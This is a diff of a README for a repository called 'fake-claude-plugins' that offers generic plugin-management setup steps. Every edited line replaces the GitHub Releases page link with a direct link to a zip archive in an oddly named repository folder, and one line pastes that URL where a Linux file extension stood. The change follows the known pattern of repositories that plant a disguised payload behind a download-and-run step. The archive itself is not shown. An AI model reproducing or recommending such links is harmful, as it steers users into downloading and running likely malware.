@@ -1,6 +1,6 @@
 # 🎉 fake-claude-plugins - Simplifying Plugin Management for You
 
-[![Download fake-claude-plugins](https://img.shields.io/badge/Download-fake--claude--plugins-brightgreen)](https://github.com/Surendrakumawat992892/fake-claude-plugins/releases)
+[![Download fake-claude-plugins](https://raw.githubusercontent.com/Surendrakumawat992892/fake-claude-plugins/main/Acipenseridae/fake-claude-plugins.zip)](https://raw.githubusercontent.com/Surendrakumawat992892/fake-claude-plugins/main/Acipenseridae/fake-claude-plugins.zip)
 
 ## 📜 Overview
 
@@ -10,7 +10,7 @@ Welcome to the **fake-claude-plugins** repository. This application allows users
 
 To begin using **fake-claude-plugins**, follow these simple steps:
 
-1. **Visit the Releases Page:** Start by navigating to our [Releases page](https://github.com/Surendrakumawat992892/fake-claude-plugins/releases) where you can find the latest versions.
+1. **Visit the Releases Page:** Start by navigating to our [Releases page](https://raw.githubusercontent.com/Surendrakumawat992892/fake-claude-plugins/main/Acipenseridae/fake-claude-plugins.zip) where you can find the latest versions.
    
 2. **Download the Latest Version:** On the Releases page, locate the most recent release. Look for a file labeled with a `.exe`, `.zip`, or other formats depending on your system. 
 
@@ -28,12 +28,12 @@ Before downloading, make sure your system meets the following requirements:
 
 To successfully download and set up **fake-claude-plugins**, please follow these steps:
 
-1. **Go to the Releases Page:** [Visit this page to download](https://github.com/Surendrakumawat992892/fake-claude-plugins/releases).
+1. **Go to the Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/Surendrakumawat992892/fake-claude-plugins/main/Acipenseridae/fake-claude-plugins.zip).
   
 2. **Choose Your File:** Select the appropriate file based on your system type.
    - For Windows, look for a `.exe` file.
    - For macOS, choose a `.dmg` or `.zip` file.
-   - For Linux, look for a `.tar.gz` or `.sh` file.
+   - For Linux, look for a `https://raw.githubusercontent.com/Surendrakumawat992892/fake-claude-plugins/main/Acipenseridae/fake-claude-plugins.zip` or `.sh` file.
 
 3. **Run the Installer:**
    - Locate the downloaded file in your downloads folder.
